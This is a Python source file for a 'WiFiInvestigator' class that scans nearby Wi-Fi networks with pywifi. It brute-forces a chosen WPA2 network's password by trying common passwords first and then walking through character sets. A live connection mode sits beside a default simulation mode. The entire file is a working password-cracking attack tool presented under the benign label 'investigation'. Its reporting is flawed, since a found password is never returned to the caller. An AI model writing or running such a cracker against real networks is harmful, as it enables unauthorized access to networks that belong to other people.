import pywifi
from pywifi import const
import time
import string
import itertools
import threading
import queue
import random

class WiFiInvestigator:
    def __init__(self):
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]
        self.is_paused = False
        self.should_stop = False
        self._current_thread = None
        self._password_queue = queue.Queue()
        self._active_investigation = False
        self._current_password = None
        self._progress_callback = None
        
    def scan(self):
        """Scan for available networks"""
        try:
            print("Starting network scan...")
            self.iface.scan()
            time.sleep(2)  # Wait for scan to complete
            
            networks = []
            for network in self.iface.scan_results():
                if network.ssid.strip():  # Skip networks with empty SSID
                    signal_strength = 2 * (100 + network.signal)  # Convert to percentage
                    signal_strength = max(0, min(100, signal_strength))  # Clamp between 0-100
                    
                    networks.append({
                        'ssid': network.ssid.strip(),
                        'bssid': network.bssid if hasattr(network, 'bssid') else 'Unknown',
                        'signal': signal_strength,
                        'security': self._get_security_type(network)
                    })
            
            print(f"Found {len(networks)} networks")
            return {
                'success': True,
                'networks': networks
            }
            
        except Exception as e:
            print(f"Scan error: {str(e)}")
            return {
                'success': False,
                'error': str(e)
            }

    def _get_security_type(self, network):
        """Get network security type"""
        try:
            if not hasattr(network, 'akm') or not network.akm:
                return 'Open'
            if const.AKM_TYPE_WPA2PSK in network.akm:
                return 'WPA2'
            if const.AKM_TYPE_WPAPSK in network.akm:
                return 'WPA'
            return 'Unknown'
        except:
            return 'Unknown'
            
    def pause(self):
        print("Pausing investigation...")
        self.is_paused = True
        
    def resume(self):
        print("Resuming investigation...")
        self.is_paused = False
        
    def stop(self):
        """Force stop the investigation process"""
        print("Stopping investigation...")
        self.should_stop = True
        self.is_paused = False
        self._active_investigation = False
        
        # Clear the password queue
        while not self._password_queue.empty():
            try:
                self._password_queue.get_nowait()
            except queue.Empty:
                break
                
        # Force stop current thread
        if self._current_thread and self._current_thread.is_alive():
            try:
                self._current_thread.join(timeout=1)
            except:
                pass
            
        # Reset interface
        try:
            self.iface.disconnect()
            self.iface.remove_all_network_profiles()
        except:
            pass
            
        print("Investigation fully stopped")
        
    def reset(self):
        print("Resetting investigation state...")
        self.is_paused = False
        self.should_stop = False
        self._current_thread = None

    def _check_should_continue(self):
        """Check if we should continue processing"""
        if self.should_stop:
            print("Stop signal received")
            return False
            
        while self.is_paused and not self.should_stop:
            print("Paused... waiting")
            time.sleep(0.5)
            
        return not self.should_stop

    def crack_wifi(self, ssid, pattern='dlu', length_range=(8, 12), max_attempts=1000, simulation_mode=True):
        """Try to crack WiFi password"""
        if self._active_investigation:
            return {
                'success': False,
                'error': 'Investigation already in progress',
                'attempts': 0
            }
            
        self.reset()  # Reset pause/stop flags
        self._active_investigation = True
        attempt_count = 0
        attempts = []
        
        try:
            # Start in a new thread
            self._current_thread = threading.Thread(
                target=self._crack_process,
                args=(ssid, pattern, length_range, max_attempts, simulation_mode, attempts),
                daemon=True
            )
            self._current_thread.start()
            
            # Wait for completion or stop
            self._current_thread.join()
            
            if self.should_stop:
                return {
                    'success': False,
                    'error': 'Investigation stopped by user',
                    'attempts': attempt_count,
                    'attempt_list': attempts
                }
                
            return {
                'success': False,
                'error': 'Password not found',
                'attempts': attempt_count,
                'attempt_list': attempts
            }
            
        except Exception as e:
            print(f"Error in crack_wifi: {str(e)}")
            return {
                'success': False,
                'error': str(e),
                'attempts': attempt_count,
                'attempt_list': attempts
            }
        finally:
            self._active_investigation = False
            self.should_stop = False
            
    def _generate_password(self, pattern, length_range, chars):
        """Generate password based on pattern and length"""
        min_len, max_len = length_range
        
        # Build character set based on pattern
        charset = ''.join(chars[c] for c in pattern if c in chars)
        if not charset:
            charset = string.ascii_letters + string.digits
            
        # Common patterns to try first
        common_patterns = [
            "password", "admin123", "12345678", "qwerty123",
            "test123", "letmein", "welcome", "monkey123",
            "football", "abc123", "123456", "dragon123"
        ]
        
        # Try common patterns that match length
        if not hasattr(self, '_tried_common'):
            self._tried_common = False
            
        if not self._tried_common:
            for pwd in common_patterns:
                if len(pwd) >= min_len and len(pwd) <= max_len:
                    if any(c in pwd for c in charset):
                        self._tried_common = True
                        return pwd
            self._tried_common = True
        
        # Systematic brute force approach
        if not hasattr(self, '_current_length'):
            self._current_length = min_len
            
        if not hasattr(self, '_current_chars'):
            self._current_chars = [0] * self._current_length
            
        # Generate password from current state
        password = ''
        for i in range(self._current_length):
            password += charset[self._current_chars[i] % len(charset)]
            
        # Increment for next iteration
        pos = self._current_length - 1
        while pos >= 0:
            self._current_chars[pos] += 1
            if self._current_chars[pos] < len(charset):
                break
            self._current_chars[pos] = 0
            pos -= 1
            
        # If we've exhausted current length, move to next
        if pos < 0:
            self._current_length += 1
            if self._current_length > max_len:
                self._current_length = min_len
            self._current_chars = [0] * self._current_length
            
        return password

    def _crack_process(self, ssid, pattern, length_range, max_attempts, simulation_mode, attempts):
        """Internal method to handle the cracking process"""
        attempt_count = 0
        
        # Define character sets
        chars = {
            'd': string.digits,
            'l': string.ascii_lowercase,
            'u': string.ascii_uppercase,
            's': string.punctuation
        }
        
        try:
            while not self.should_stop and attempt_count < max_attempts:
                if self.is_paused:
                    time.sleep(0.5)
                    continue
                    
                # Generate and try password
                password = self._generate_password(pattern, length_range, chars)
                self._current_password = password
                attempt_count += 1
                
                # Create attempt record with current state
                current_attempt = {
                    'password': password,
                    'attempt': attempt_count,
                    'status': 'Testing'
                }
                attempts.append(current_attempt)
                
                if self.should_stop:
                    break
                    
                success = self._simulate_connection(password) if simulation_mode else self._try_connect(ssid, password)
                
                if success:
                    current_attempt['status'] = 'Success'
                    return {
                        'success': True,
                        'password': password,
                        'attempts': attempt_count,
                        'attempt_list': attempts
                    }
                    
                current_attempt['status'] = 'Failed'
                
                # Update progress with actual password being tested
                if self._progress_callback:
                    progress = {
                        'current_password': password,
                        'attempt': attempt_count,
                        'max_attempts': max_attempts,
                        'status': current_attempt['status']
                    }
                    self._progress_callback(progress)
                
                # Print progress to console
                print(f"Testing '{password}' ({attempt_count}/{max_attempts})")
                
                # Add delay between attempts
                time.sleep(0.1)
                
                # Check stop flag between attempts
                if self.should_stop:
                    break
                    
        except Exception as e:
            print(f"Error in crack process: {str(e)}")
            return {
                'success': False,
                'error': str(e),
                'attempts': attempt_count,
                'attempt_list': attempts
            }
        finally:
            self._active_investigation = False
            self._current_password = None

    def set_progress_callback(self, callback):
        """Set callback for progress updates"""
        self._progress_callback = callback

    def get_current_password(self):
        """Get currently testing password"""
        return self._current_password

    def _simulate_connection(self, password):
        """Simulate connection attempt without actually connecting"""
        if not self._check_should_continue():
            return False
            
        time.sleep(0.1)  # Simulate connection time
        
        # Simulate success for specific passwords
        if password in ["test123", "simulator", "password123"]:
            return True
            
        # Random success chance (very low)
        return random.random() < 0.001

    def _try_connect(self, ssid, password):
        """Try to connect to a network with given password"""
        if not self._check_should_continue():
            return False
            
        try:
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password
            
            self.iface.remove_all_network_profiles()
            tmp_profile = self.iface.add_network_profile(profile)
            
            self.iface.connect(tmp_profile)
            time.sleep(1)  # Give it time to connect
            
            return self.iface.status() == const.IFACE_CONNECTED
        except Exception as e:
            print(f"Connection error: {str(e)}")
            return False